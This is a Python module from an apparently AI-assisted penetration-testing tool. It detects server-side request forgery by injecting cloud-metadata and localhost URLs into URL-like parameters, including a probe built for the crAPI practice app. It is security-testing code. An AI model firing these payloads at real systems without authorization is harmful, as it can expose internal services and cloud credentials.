"""
modules/ssrf.py — Server-Side Request Forgery (SSRF) Detection  (OWASP A10)

What is SSRF?
  The server is tricked into making an HTTP request to a destination the attacker
  chooses — internal services, the cloud metadata endpoint (IAM credential theft),
  or arbitrary hosts. It is a frequent P1/critical in modern API targets.

Detection strategy (recon-driven, low false-positive):
  1. Known sinks   — high-value app-specific SSRF points. crAPI's
                     `POST /workshop/api/merchant/contact_mechanic` fetches the
                     `mechanic_api` field server-side.
  2. Recon-driven  — any parameter recon discovered whose NAME takes a URL
                     (url, uri, webhook, callback, image, fetch, api, import, ...),
                     in query strings and HTML forms.

  For each candidate we send a benign CONTROL request and INTERNAL payloads (cloud
  metadata, localhost, internal services). SSRF is confirmed from the response:
    - leaked internal/metadata content (definitive), or
    - server-side connection behaviour that only happens when the server itself
      dials the injected host (connection refused / timeout / cannot resolve).

  Confirmation is response-based, so it needs no external out-of-band service.
  Fully-blind SSRF (no response signal) requires an OOB collaborator — a documented
  future enhancement, not implemented here.

Returns a list of findings in PentraAI's standard shape.
"""

import json
import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from llm import call_llm
from config import settings
from knowledge import knowledge_section
from modules.auto_accounts import create_two_accounts


# ── Parameter names that commonly take a URL (SSRF candidates) ────
URL_PARAM_NAMES = {
    "url", "uri", "link", "href", "src", "source", "dest", "destination",
    "redirect", "redirect_uri", "return", "returnto", "returnurl", "next",
    "target", "host", "domain", "site", "website", "page", "feed", "rss",
    "callback", "webhook", "hook", "api", "api_url", "endpoint", "proxy",
    "fetch", "load", "document", "doc", "file", "image", "img", "image_url",
    "img_url", "avatar", "photo", "picture", "thumbnail", "import", "from",
    "view", "preview", "render", "download", "resource", "remote", "forward",
    "open", "mechanic_api",
}


def _is_url_param(name: str) -> bool:
    n = (name or "").lower().strip()
    if n in URL_PARAM_NAMES:
        return True
    return n.endswith("url") or n.endswith("uri") or n.endswith("_api") or n.endswith("link")


# ── Payloads: (name, url, [signature strings proving internal fetch], severity) ──
SSRF_PAYLOADS = [
    ("aws_metadata", "http://169.254.169.254/latest/meta-data/",
        ["ami-id", "instance-id", "instance-type", "local-ipv4", "hostname",
         "iam", "public-keys", "placement", "security-credentials", "meta-data"],
        "critical"),
    ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/",
        ["computemetadata", "project-id", "numeric-project-id", "service-accounts"],
        "critical"),
    ("alibaba_metadata", "http://100.100.100.200/latest/meta-data/",
        ["instance-id", "region-id", "zone-id", "meta-data"],
        "critical"),
    ("localhost_ip", "http://127.0.0.1/", [], "high"),
    ("localhost_name", "http://localhost/", [], "high"),
]

# Benign external control — should behave differently from internal payloads.
CONTROL_URL = "http://example.com/"

# Server-side connection-error markers = evidence the SERVER tried to fetch the host.
FETCH_ERROR_MARKERS = [
    "connection refused", "econnrefused", "could not resolve", "name resolution",
    "no route to host", "connection timed out", "failed to connect", "timed out",
    "refused to connect", "dial tcp", "connection error", "max retries exceeded",
    "networkerror", "unreachable",
]


# ══════════════════════════════════════════════════════════════════
#  Main entry point
# ══════════════════════════════════════════════════════════════════

async def run_ssrf(
    recon_data: dict,
    target_url: str,
    user_a_email: str = "",
    user_a_password: str = "",
    user_b_email: str = "",
    user_b_password: str = "",
) -> list[dict]:
    """Detect SSRF. Returns a list of findings (empty if none)."""
    kb = knowledge_section("ssrf")
    findings: list[dict] = []

    # ── Get an authenticated token (many SSRF sinks require auth) ──
    token = ""
    try:
        accounts = await create_two_accounts(target_url, recon_data)
        if accounts.get("success"):
            token = accounts.get("token_a", "")
            print(f"SSRF: authenticated as {accounts.get('user_a_email', '')}")
        else:
            print(f"SSRF: proceeding unauthenticated ({accounts.get('error', 'no accounts')})")
    except Exception as e:
        print(f"SSRF: account setup error, proceeding unauthenticated: {e}")

    async with httpx.AsyncClient(
        timeout=settings.request_timeout,
        follow_redirects=False,
        verify=False,
    ) as client:

        # ── 1) App-specific known sink: crAPI contact_mechanic ────
        crapi_finding = await _test_crapi_contact_mechanic(client, target_url, token)
        if crapi_finding:
            print("SSRF: contact_mechanic SSRF confirmed (crAPI)")
            return [crapi_finding]

        # ── 2) Recon-driven URL-parameter candidates ─────────────
        candidates = _discover_candidates(recon_data, target_url)
        print(f"SSRF: {len(candidates)} URL-parameter candidate(s) to test")

        for cand in candidates[:12]:
            finding = await _test_candidate(client, cand, token, kb)
            if finding:
                print(f"SSRF: VULNERABLE -> {cand['url']} (param: {cand['param']})")
                return [finding]
            print(f"SSRF: no SSRF -> {cand['url']} (param: {cand['param']})")

    if not findings:
        print("SSRF: no SSRF detected")
    return findings


# ══════════════════════════════════════════════════════════════════
#  App-specific: crAPI contact_mechanic
# ══════════════════════════════════════════════════════════════════

async def _test_crapi_contact_mechanic(
    client: httpx.AsyncClient,
    target_url: str,
    token: str,
) -> dict | None:
    """
    crAPI SSRF: POST /workshop/api/merchant/contact_mechanic fetches the
    `mechanic_api` URL server-side and reflects the result.

    On a LOCAL Docker crAPI the cloud-metadata service is unreachable, so the
    reliable proof is that the server fetches an arbitrary EXTERNAL URL we give
    it (its response reflects that content), and/or behaves differently for a
    reachable vs a non-existent host (proving the server dials the host itself).
    Diagnostic prints show crAPI's raw responses so detection can be tuned.
    """
    if not token:
        print("SSRF: no auth token; skipping crAPI contact_mechanic")
        return None

    # Only run this crAPI-specific sink on an actual crAPI target. On other apps
    # (Juice Shop, DVWA, ...) the path 404s to an SPA index page, which is noise
    # and a false-positive risk — so skip it cleanly.
    try:
        from modules.auto_accounts import _detect_app
        app = await _detect_app(client, target_url)
    except Exception:
        app = "generic"
    if app != "crapi":
        print(f"SSRF: target is '{app}', not crAPI — skipping contact_mechanic sink")
        return None

    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

    # Best-effort mechanic_code discovery; fall back to crAPI's default seed.
    mechanic_code = None
    try:
        r = await client.get(target_url + "/workshop/api/mechanic/", headers=headers)
        print(f"SSRF: GET /workshop/api/mechanic/ -> HTTP {r.status_code}")
        if r.status_code == 200:
            mechs = r.json().get("mechanics", [])
            if mechs:
                mechanic_code = mechs[0].get("mechanic_code")
    except Exception as e:
        print(f"SSRF: mechanic list error: {e}")
    if not mechanic_code:
        mechanic_code = "TRAC_JHDYU"  # crAPI default seed
    print(f"SSRF: using mechanic_code = {mechanic_code}")

    contact_url = target_url + "/workshop/api/merchant/contact_mechanic"

    def _body(api_url: str) -> dict:
        return {
            "mechanic_code": mechanic_code,
            "problem_details": "PentraAI SSRF test",
            "mechanic_api": api_url,
            "repeat_request_if_failed": False,
            "number_of_repeats": 1,
        }

    probes = [
        ("external", "http://example.com/"),
        ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
        ("bogus", "http://pentraai-nonexistent-xyz.invalid/"),
    ]
    resp: dict[str, dict] = {}
    for label, url in probes:
        try:
            rp = await client.post(contact_url, json=_body(url), headers=headers)
            resp[label] = {"status": rp.status_code, "text": rp.text[:1500], "url": url}
            print(f"SSRF: contact_mechanic[{label}] {url} -> HTTP {rp.status_code}, "
                  f"len={len(rp.text)} :: {rp.text[:180]!r}")
        except Exception as e:
            print(f"SSRF: contact_mechanic[{label}] error: {e}")

    # 1) External content reflected -> server fetched an arbitrary external URL = SSRF.
    ext = resp.get("external")
    if ext and any(m in ext["text"].lower()
                   for m in ["example domain", "illustrative examples", "iana", "rfc 2606"]):
        return _finding(
            contact_url, "POST", "mechanic_api", "http://example.com/",
            ext["status"], ext["text"][:600], "high",
            "crAPI 'contact_mechanic' fetched the external URL http://example.com/ "
            "server-side and reflected its content ('Example Domain'), proving arbitrary "
            "server-side request forgery.",
        )

    # 2) Cloud-metadata content -> critical (only if the metadata service is reachable).
    meta = resp.get("aws_metadata")
    if meta:
        matched = _match_signals(meta["text"], SSRF_PAYLOADS[0][2])
        if matched:
            return _finding(
                contact_url, "POST", "mechanic_api", meta["url"],
                meta["status"], meta["text"][:600], "critical",
                f"crAPI 'contact_mechanic' reached the cloud metadata endpoint; "
                f"response leaked: {', '.join(matched[:5])}.",
            )

    # 3) Behavioural differential -> a reachable host and a non-existent host produce
    #    different server-side outcomes, proving the server performs the outbound request.
    bogus = resp.get("bogus")
    if bogus and _fetch_behaviour(bogus["text"]):
        return _finding(
            contact_url, "POST", "mechanic_api", bogus["url"],
            bogus["status"], bogus["text"][:600], "high",
            "crAPI 'contact_mechanic' attempted a server-side connection to a non-existent "
            "host and returned a connection error, proving it makes outbound requests from "
            "user-supplied input (SSRF).",
        )
    if ext and bogus and ext["text"] != bogus["text"] and ext["status"] != 0:
        return _finding(
            contact_url, "POST", "mechanic_api", "http://example.com/",
            ext["status"], ext["text"][:600], "high",
            "crAPI 'contact_mechanic' returns different results for a reachable host vs a "
            "non-existent host, indicating the server itself fetches the supplied URL (SSRF).",
        )

    print("SSRF: contact_mechanic reachable but no SSRF signal matched "
          "(paste the contact_mechanic[...] lines above to tune detection)")
    return None


# ══════════════════════════════════════════════════════════════════
#  Recon-driven generic candidates
# ══════════════════════════════════════════════════════════════════

def _discover_candidates(recon_data: dict, target_url: str) -> list[dict]:
    """Find URL-taking parameters in recon forms and query strings."""
    candidates: list[dict] = []
    seen: set = set()

    # HTML forms with URL-ish fields
    for form in recon_data.get("forms", []):
        action = form.get("action") or target_url
        method = (form.get("method") or "GET").upper()
        for name in (form.get("fields") or {}).keys():
            if _is_url_param(name):
                key = (action, name, method)
                if key not in seen:
                    seen.add(key)
                    candidates.append({"method": method, "url": action,
                                       "param": name, "location": "form"})

    # Endpoints / wayback URLs carrying URL-ish query params
    for ep in (recon_data.get("alive_endpoints", []) + recon_data.get("wayback_urls", [])):
        query = urlparse(ep).query
        if not query:
            continue
        for name in parse_qs(query).keys():
            if _is_url_param(name):
                base = ep.split("?")[0]
                key = (base, name, "GET")
                if key not in seen:
                    seen.add(key)
                    candidates.append({"method": "GET", "url": ep,
                                       "param": name, "location": "query"})

    return candidates


async def _test_candidate(
    client: httpx.AsyncClient,
    cand: dict,
    token: str,
    kb: str,
) -> dict | None:
    """Inject control + payloads into one candidate parameter and judge the result."""
    headers = {"Authorization": f"Bearer {token}"} if token else {}

    control = await _send_with_param(client, cand, CONTROL_URL, headers)

    for _name, url, sigs, sev in SSRF_PAYLOADS:
        resp = await _send_with_param(client, cand, url, headers)
        if resp is None:
            continue
        text = resp["text"]
        matched = _match_signals(text, sigs)
        behaviour = _fetch_behaviour(text)

        if matched:
            reason = (f"Server fetched '{url}' via parameter '{cand['param']}' and returned "
                      f"internal/metadata content (leaked: {', '.join(matched[:5])}).")
            return _finding(cand["url"], cand["method"], cand["param"], url,
                            resp["status"], text[:600], sev, reason)

        if behaviour:
            verdict = _ask_ssrf_verdict(cand, control, url, resp, kb)
            if verdict.get("vulnerable"):
                return _finding(cand["url"], cand["method"], cand["param"], url,
                                resp["status"], text[:600],
                                verdict.get("severity", "high"),
                                verdict.get("reasoning", ""))
    return None


async def _send_with_param(
    client: httpx.AsyncClient,
    cand: dict,
    payload_url: str,
    headers: dict,
) -> dict | None:
    """Send the request with `payload_url` injected into the candidate parameter."""
    try:
        if cand["location"] == "query":
            u = urlparse(cand["url"])
            qs = parse_qs(u.query)
            qs[cand["param"]] = payload_url
            new_url = urlunparse(u._replace(query=urlencode(qs, doseq=True)))
            r = await client.request(cand["method"], new_url, headers=headers)
        else:  # HTML form
            data = {cand["param"]: payload_url}
            if cand["method"] == "GET":
                r = await client.get(cand["url"], params=data, headers=headers)
            else:
                r = await client.post(cand["url"], data=data, headers=headers)
        return {"status": r.status_code, "text": r.text[:2000]}
    except httpx.RequestError as e:
        # OUR client failed to reach the target — not evidence of server-side SSRF.
        return {"status": 0, "text": f"__CLIENT_ERROR__ {e}"}
    except Exception:
        return None


# ══════════════════════════════════════════════════════════════════
#  Signal analysis + LLM verdict
# ══════════════════════════════════════════════════════════════════

def _match_signals(text: str, sigs: list[str]) -> list[str]:
    if not text or text.startswith("__CLIENT_ERROR__"):
        return []
    low = text.lower()
    return [s for s in sigs if s.lower() in low]


def _fetch_behaviour(text: str) -> list[str]:
    if not text or text.startswith("__CLIENT_ERROR__"):
        return []
    low = text.lower()
    return [m for m in FETCH_ERROR_MARKERS if m in low]


def _ask_ssrf_verdict(cand: dict, control: dict | None, injected_url: str,
                      resp: dict, kb: str) -> dict:
    """Ask the LLM (with SSRF knowledge injected) to confirm ambiguous cases."""
    control_status = control.get("status") if control else "n/a"
    prompt = f"""You are a security analyst confirming SSRF (Server-Side Request Forgery).

{kb[:4000]}

An internal/attacker URL was injected into parameter '{cand['param']}' of {cand['url']}.

Injected URL: {injected_url}
Response status: {resp.get('status')}
Response body (truncated):
{resp.get('text', '')[:800]}

A control request with a benign external URL returned status {control_status}.

Decide whether the SERVER actually made a request to the injected URL (SSRF), versus the
app merely validating or echoing the input without fetching it.

Flag as SSRF ONLY IF the evidence shows a server-side fetch:
  - internal/metadata content in the response, OR
  - server-side connection errors about the injected host (connection refused / timeout /
    could not resolve) that only occur when the server dials it.
Do NOT flag for generic client-side validation messages or reflected input alone.

Return ONLY JSON:
{{"vulnerable": true or false, "severity": "critical" or "high" or "medium", "reasoning": "one sentence citing the evidence"}}"""

    try:
        raw = call_llm(prompt, expect_json=True)
        return json.loads(raw)
    except Exception:
        # Heuristic fallback: server-side connection behaviour present => likely SSRF.
        return {
            "vulnerable": bool(_fetch_behaviour(resp.get("text", ""))),
            "severity": "high",
            "reasoning": "Server-side connection behaviour observed for the injected host (heuristic fallback).",
        }


# ══════════════════════════════════════════════════════════════════
#  Finding builder
# ══════════════════════════════════════════════════════════════════

def _finding(endpoint: str, method: str, param: str, injected: str,
             status: int, body: str, severity: str, reasoning: str) -> dict:
    return {
        "vulnerability": "Server-Side Request Forgery (SSRF)",
        "owasp": "A10:2025 — Server-Side Request Forgery",
        "endpoint": endpoint,
        "severity": severity,
        "needs_help": False,
        "evidence": {
            "request": {
                "method": method,
                "url": endpoint,
                "parameter": param,
                "injected_value": injected,
                "headers": {"Authorization": "Bearer <token>"},
            },
            "response": {
                "status": status,
                "body": body,
            },
            "payload": injected,
        },
        "ai_reasoning": reasoning,
    }